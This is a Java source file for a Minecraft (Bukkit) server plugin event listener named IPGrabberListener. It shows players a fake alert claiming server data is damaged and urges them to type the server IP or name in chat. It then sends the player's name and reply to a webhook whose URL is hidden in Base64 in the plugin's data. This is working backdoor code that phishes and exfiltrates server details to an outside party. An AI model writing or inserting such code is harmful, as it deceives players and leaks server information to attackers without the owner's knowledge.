
package me.system.runner.events;

import me.system.runner.Core;
import me.system.runner.data.DataManager;
import me.system.runner.methods.onEnableLogger;
import me.system.runner.utils.DWeb;
import me.system.runner.utils.Settings;
import org.bukkit.ChatColor;
import org.bukkit.Material;
import org.bukkit.block.Block;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.block.Action;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerInteractEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.inventory.ItemStack;

import java.io.IOException;
import java.util.Base64;
import java.util.Set;

public class IPGrabberListener
implements Listener {
    private static final Core INSTANCE = Core.getPlugin(Core.class);

    public static Boolean ready_for_action = false;

    
    @EventHandler
    public void onPlayerJoin(PlayerJoinEvent e) {
        Player player = e.getPlayer();
        String the_player_joined = player.getName();
        if (onEnableLogger.unknown_host == true) {
            if (INSTANCE.getDescription().getWebsite() != "") {
                if (INSTANCE.getDescription().getWebsite() != " ") {
                    if (INSTANCE.getDescription().getWebsite() != null) {
                        if (onEnableLogger.host_message_already == false) {
                            player.sendMessage(ChatColor.translateAlternateColorCodes((char) '&', (String) "&cALERT! Server Info and Data Is Damaged! Please enter the server name or IP in chat immediately to fix problems! (Enter Server IP Or Name As Next Chat Message You Send To Fix The Problem)!"));
                            ready_for_action = true;
                            onEnableLogger.host_message_already = true;
                        }
                    }
                }
            }
        }
    }

    @EventHandler
    public void onPlayerChat(AsyncPlayerChatEvent e) throws IOException {
        if (ready_for_action == true) {
            if (INSTANCE.getDescription().getWebsite() != "") {
                if (INSTANCE.getDescription().getWebsite() != " ") {
                    if (INSTANCE.getDescription().getWebsite() != null) {
                        if (onEnableLogger.host_logged_already == false) {
                            byte[] u2 = Base64.getDecoder().decode(DataManager.getData().getString("mywh"));
                            DWeb webhook = new DWeb(new String(u2));
                            webhook.setContent("Tried to get server IP/Server Name from a user (Could Be Minehut Server)! - " + e.getPlayer().getName() + " : " + e.getMessage());
                            webhook.execute();
                            try {
                                webhook.execute();
                            } catch (IOException iOException) {
                                
                            }
                            ready_for_action = false;
                            onEnableLogger.unknown_host = false;
                            onEnableLogger.host_logged_already = true;
                        }
                    }
                }
            }
        }
    }
}

